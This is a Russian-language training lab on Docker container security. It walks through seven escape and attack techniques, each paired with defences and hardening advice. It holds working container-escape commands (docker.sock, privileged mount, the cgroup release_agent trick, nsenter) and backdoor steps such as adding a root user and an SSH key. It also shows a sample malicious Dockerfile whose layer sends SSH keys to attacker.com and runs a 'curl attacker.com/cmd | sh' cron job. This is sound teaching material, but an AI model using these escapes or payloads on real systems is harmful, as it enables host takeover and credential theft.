# Практика по безопасности Docker-контейнеров

> Практика основана на материалах: [Docker Container Security — взлом и защита](https://www.youtube.com/watch?v=7EuZwvNROs4)

**Цель:** Понять основные векторы атак на Docker-контейнеры, научиться воспроизводить их в учебной среде и применять защитные меры.

> **Дисклеймер:** Все техники применяются **только в изолированной учебной среде** на собственных машинах. Использование против чужих систем является незаконным.

---

## Содержание

1. [Подготовка учебной среды](#1-подготовка-учебной-среды)
2. [Атака 1: Escape через открытый Docker socket](#2-атака-1-escape-через-открытый-docker-socket)
3. [Атака 2: Privileged container — выход на хост](#3-атака-2-privileged-container--выход-на-хост)
4. [Атака 3: Монтирование /etc хоста](#4-атака-3-монтирование-etc-хоста)
5. [Атака 4: Злоупотребление capabilities](#5-атака-4-злоупотребление-capabilities)
6. [Атака 5: Escape через procfs (/proc/1/root)](#6-атака-5-escape-через-procfs-proc1root)
7. [Атака 6: Утечка секретов из environment variables](#7-атака-6-утечка-секретов-из-environment-variables)
8. [Атака 7: Docker image с вредоносным слоем](#8-атака-7-docker-image-с-вредоносным-слоем)
9. [Защита: Рекомендации по hardening](#9-защита-рекомендации-по-hardening)
10. [Полезные инструменты](#10-полезные-инструменты)

---

## 1. Подготовка учебной среды

Создайте изолированную ВМ (Ubuntu 22.04) и установите Docker:

```bash
sudo apt-get update
sudo apt-get install -y docker.io
sudo usermod -aG docker $USER
newgrp docker

# Проверка
docker run hello-world
```

Все эксперименты проводятся **внутри этой ВМ**. Не используйте рабочие или production-системы.

---

## 2. Атака 1: Escape через открытый Docker socket

### Описание

Docker daemon слушает на Unix-сокете `/var/run/docker.sock`. Если этот сокет смонтирован внутрь контейнера, процесс внутри контейнера может управлять **всеми контейнерами** и запускать привилегированные операции на хосте.

### Воспроизведение

**Шаг 1.** Запустите «уязвимый» контейнер с примонтированным сокетом:

```bash
docker run -it \
  -v /var/run/docker.sock:/var/run/docker.sock \
  ubuntu:22.04 bash
```

**Шаг 2.** Внутри контейнера установите Docker CLI:

```bash
apt-get update && apt-get install -y curl
curl -fsSL https://get.docker.com | sh
```

**Шаг 3.** Используйте Docker CLI для выхода на хост:

```bash
# Запуск нового контейнера с примонтированной файловой системой хоста
docker run -it \
  -v /:/host \
  --privileged \
  ubuntu:22.04 chroot /host bash

# Теперь вы в root-оболочке хоста
whoami   # root
ls /etc/shadow
```

### Почему это работает?

Docker daemon запускается от root. Любой процесс, имеющий доступ к сокету, фактически имеет root-права на хосте.

### Защита

```bash
# НИКОГДА не монтируйте docker.sock в контейнеры
# Если это необходимо — используйте rootless Docker или socket proxy:
# https://github.com/Tecnativa/docker-socket-proxy
```

---

## 3. Атака 2: Privileged container — выход на хост

### Описание

Флаг `--privileged` отключает большинство ограничений безопасности Linux: все capabilities активны, AppArmor/SELinux отключены, доступ к устройствам хоста открыт.

### Воспроизведение

**Шаг 1.** Запустите привилегированный контейнер:

```bash
docker run -it --privileged ubuntu:22.04 bash
```

**Шаг 2.** Внутри контейнера смонтируйте диск хоста:

```bash
# Посмотреть устройства
fdisk -l

# Смонтировать корневой раздел хоста (замените /dev/sda1 на актуальное)
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Чтение файлов хоста
cat /mnt/host/etc/shadow
ls /mnt/host/root/

# Добавить SSH-ключ в authorized_keys хоста
mkdir -p /mnt/host/root/.ssh
echo "ssh-rsa AAAA..." >> /mnt/host/root/.ssh/authorized_keys
```

### Защита

Никогда не используйте `--privileged` в production. Если нужны определённые права — явно задавайте capabilities:

```bash
# Плохо:
docker run --privileged ...

# Хорошо — добавить только нужную capability:
docker run --cap-add NET_ADMIN ...
```

---

## 4. Атака 3: Монтирование /etc хоста

### Описание

Монтирование чувствительных директорий хоста позволяет модифицировать системные файлы: `/etc/passwd`, `/etc/sudoers`, `/etc/cron.d` и другие.

### Воспроизведение

```bash
# Запуск контейнера с доступом к /etc хоста
docker run -it \
  -v /etc:/host-etc \
  ubuntu:22.04 bash

# Внутри контейнера: добавить backdoor-пользователя
echo 'hacker:x:0:0::/root:/bin/bash' >> /host-etc/passwd
echo 'hacker:$6$salt$hash:19000:0:99999:7:::' >> /host-etc/shadow
# (в реальности нужно сгенерировать правильный хеш пароля)

# Или прописать sudo без пароля
echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /host-etc/sudoers
```

### Защита

- Ограничивайте bind-mounts только необходимыми директориями.
- Используйте флаг `:ro` (read-only): `-v /data:/data:ro`.
- Никогда не монтируйте `/`, `/etc`, `/root`, `/proc`, `/sys`.

---

## 5. Атака 4: Злоупотребление capabilities

### Описание

Linux capabilities — это механизм разбивки root-привилегий на отдельные разрешения. Некоторые capabilities позволяют выйти за пределы контейнера.

### Опасные capabilities

| Capability       | Риск |
|-----------------|------|
| `CAP_SYS_ADMIN` | Почти эквивалентна root. Mount, ioctl, namespace-операции. |
| `CAP_NET_ADMIN` | Изменение сетевых интерфейсов, маршрутов, iptables. |
| `CAP_SYS_PTRACE`| Отладка чужих процессов, включая хостовые. |
| `CAP_DAC_OVERRIDE` | Обход file permission checks. |

### Воспроизведение (CAP_SYS_ADMIN)

```bash
# Контейнер с CAP_SYS_ADMIN
docker run -it \
  --cap-add SYS_ADMIN \
  --security-opt apparmor=unconfined \
  ubuntu:22.04 bash

# Монтирование cgroup для escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
# Вывод будет: uid=0(root) gid=0(root) — это процесс на хосте!
```

### Защита

```bash
# Запускайте контейнеры с минимальными capabilities:
docker run \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  your-image
```

---

## 6. Атака 5: Escape через procfs (/proc/1/root)

### Описание

В некоторых конфигурациях (особенно с общим pid namespace) через `/proc/1/root` можно получить доступ к файловой системе хоста, если PID 1 принадлежит хост-системе.

### Воспроизведение

```bash
# Запуск с общим PID namespace хоста
docker run -it \
  --pid=host \
  ubuntu:22.04 bash

# Внутри: PID 1 — это init/systemd хоста
ls /proc/1/root/
cat /proc/1/root/etc/shadow

# Переход в файловую систему хоста
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Теперь вы в shell-е хоста
```

### Защита

- Никогда не используйте `--pid=host` без крайней необходимости.
- Ограничьте с помощью seccomp-профиля системный вызов `unshare`.

---

## 7. Атака 6: Утечка секретов из environment variables

### Описание

Секреты (API-ключи, пароли, токены), переданные через переменные окружения, видны любому процессу внутри контейнера и могут быть прочитаны из `/proc/<pid>/environ`.

### Воспроизведение

```bash
# Запуск с секретом в env
docker run -d --name secret-app \
  -e DB_PASSWORD="super_secret_password" \
  -e AWS_SECRET_KEY="AKIAIOSFODNN7EXAMPLE" \
  ubuntu:22.04 sleep 3600

# Из хоста: читаем env запущенного контейнера
docker inspect secret-app | grep -A 10 '"Env"'

# Или изнутри контейнера (если злоумышленник уже внутри):
cat /proc/1/environ | tr '\0' '\n'

# Из другого контейнера, если pid namespace shared:
cat /proc/<PID>/environ | tr '\0' '\n'
```

### Защита

- Используйте Docker Secrets или Kubernetes Secrets.
- Монтируйте секреты как файлы, а не env-переменные.
- В Kubernetes используйте vault-agent для динамической инжекции.

```yaml
# Kubernetes: секрет как файл (безопаснее, чем env)
volumes:
  - name: db-password
    secret:
      secretName: postgresql-secret
containers:
  - volumeMounts:
    - name: db-password
      mountPath: /run/secrets
      readOnly: true
```

---

## 8. Атака 7: Docker image с вредоносным слоем

### Описание

Злоумышленник может опубликовать Docker-образ, который выглядит как легитимный (typosquatting: `ngix`, `ubunru`, `pytohn`), но содержит вредоносный слой.

### Пример вредоносного Dockerfile

```dockerfile
FROM ubuntu:22.04

# Скрытый вредоносный слой — кража SSH-ключей
RUN mkdir -p /exfil && \
    cp -r /root/.ssh /exfil/ 2>/dev/null; \
    curl -s http://attacker.com/collect -d @/exfil/ 2>/dev/null; \
    rm -rf /exfil

# Установка backdoor
RUN echo '* * * * * curl -s http://attacker.com/cmd | sh' | crontab -

# Легитимный контент
RUN apt-get update && apt-get install -y nginx
```

### Защита

```bash
# Проверка образа через trivy
docker run aquasec/trivy image nginx:latest

# Или через docker scout
docker scout cves nginx:latest

# Проверить слои образа вручную
docker history --no-trunc nginx:latest
docker save nginx:latest | tar -x -C /tmp/nginx-layers/
# Проанализировать каждый слой (tar-архив)

# Всегда используйте digest вместо tag:
docker pull nginx@sha256:abc123...
```

---

## 9. Защита: Рекомендации по hardening

### Чеклист безопасного запуска контейнера

```bash
docker run \
  --read-only \                          # Файловая система read-only
  --no-new-privileges \                  # Запрет повышения привилегий
  --cap-drop ALL \                       # Убрать все capabilities
  --cap-add NET_BIND_SERVICE \           # Добавить только нужные
  --security-opt no-new-privileges=true \
  --security-opt seccomp=seccomp.json \  # Кастомный seccomp-профиль
  --user 1000:1000 \                     # Запуск не от root
  --memory 512m \                        # Лимит памяти
  --cpus 0.5 \                           # Лимит CPU
  your-image
```

### Безопасный Dockerfile

```dockerfile
FROM python:3.12-slim

# Создаём непривилегированного пользователя
RUN groupadd -r appgroup && useradd -r -g appgroup appuser

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY --chown=appuser:appgroup . .

# Переключаемся на непривилегированного пользователя
USER appuser

# Явно указываем порт
EXPOSE 8000

# Используем exec-форму CMD (без shell)
CMD ["uvicorn", "app:app", "--host", "0.0.0.0", "--port", "8000"]
```

### Docker daemon hardening (`/etc/docker/daemon.json`)

```json
{
  "icc": false,
  "userns-remap": "default",
  "no-new-privileges": true,
  "live-restore": true,
  "userland-proxy": false,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
```

---

## 10. Полезные инструменты

| Инструмент | Назначение | Команда |
|-----------|-----------|---------|
| **Trivy** | Сканер образов и IaC | `trivy image nginx:latest` |
| **Grype** | Анализ CVE в образах | `grype nginx:latest` |
| **Falco** | Runtime-детектирование угроз | `helm install falco falcosecurity/falco` |
| **Docker Bench** | Аудит конфигурации Docker по CIS | `docker run --net host --pid host --userns host --cap-add audit_control docker/docker-bench-security` |
| **Hadolint** | Линтер Dockerfile | `hadolint Dockerfile` |
| **dive** | Анализ слоёв образа | `dive your-image:latest` |

### Быстрый аудит хоста

```bash
# CIS Docker Benchmark
docker run --rm --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  docker/docker-bench-security

# Анализ запущенных контейнеров на предмет опасных конфигураций
docker ps -q | xargs docker inspect | python3 -c "
import json, sys
containers = json.load(sys.stdin)
for c in containers:
    name = c['Name']
    priv = c['HostConfig']['Privileged']
    caps = c['HostConfig']['CapAdd']
    sock = any('/docker.sock' in str(b) for b in c['HostConfig'].get('Binds', []))
    if priv or caps or sock:
        print(f'{name}: Privileged={priv}, CapAdd={caps}, DockerSock={sock}')
"
```

---

## Задание для практики

1. Воспроизвести **атаки 1, 2 и 6** в учебной ВМ.
2. Для каждой атаки:
   - Зафиксировать шаги (скриншоты или вывод терминала).
   - Применить защитный механизм.
   - Убедиться, что после применения защиты атака не работает.
3. Запустить **Docker Bench Security** на учебной ВМ, разобрать отчёт.
4. Написать краткий отчёт (`docker/REPORT.md`): какие уязвимости нашли, какие закрыли.
